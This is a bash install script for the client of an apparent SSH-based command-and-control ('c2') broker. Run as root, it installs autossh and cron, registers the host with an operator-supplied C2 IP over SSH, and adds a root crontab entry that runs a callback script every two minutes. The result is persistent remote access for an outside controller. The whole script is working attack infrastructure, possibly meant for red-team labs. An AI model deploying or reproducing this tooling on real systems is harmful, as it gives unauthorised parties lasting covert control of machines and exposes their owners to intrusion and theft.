#!/usr/bin/env bash
#ensure you run out of /opt/ssh-c2-broker/Client/
key="/root/id_ed25519"
if [[ ! -f "$key" ]]; then
  echo "Error: key file not found: $key" >&2
  exit 1
fi
apt-get update
apt-get install autossh cron -y
ip=`cat /opt/ssh-c2-broker/Client/c2_ip.txt`
if [[ "$ip" == "127.0.0.1" ]]; then
  read -r -p "C2 IP is not set. Enter C2 IP: " ip
  echo "$ip" > /opt/ssh-c2-broker/Client/c2_ip.txt
  ip=`cat /opt/ssh-c2-broker/Client/c2_ip.txt`
fi
tag=`cat /opt/ssh-c2-broker/Client/c2_tag.txt`
if [[ "$tag" == "default" ]]; then
  read -r -p "Tag is not set. Enter tag: " tag
  echo "$tag" > /opt/ssh-c2-broker/Client/c2_tag.txt
  tag=`cat /opt/ssh-c2-broker/Client/c2_tag.txt`
fi
port=`cat /opt/ssh-c2-broker/Client/c2_port.txt`
username="c2"
hostname=`hostname`
service ssh start
systemctl enable ssh
systemctl enable cron
persistentport=`ssh -o StrictHostKeyChecking=accept-new -p $port -i $key $username@$ip "registerc2.sh $hostname $tag"`
echo "$persistentport" > /opt/ssh-c2-broker/Client/persistent_port.txt
grep -qF "*/2 * * * * root  /opt/ssh-c2-broker/Client/callback.sh" /etc/crontab || echo "*/2 * * * * root  /opt/ssh-c2-broker/Client/callback.sh" >> /etc/crontab
service cron restart
/opt/ssh-c2-broker/Client/callback.sh &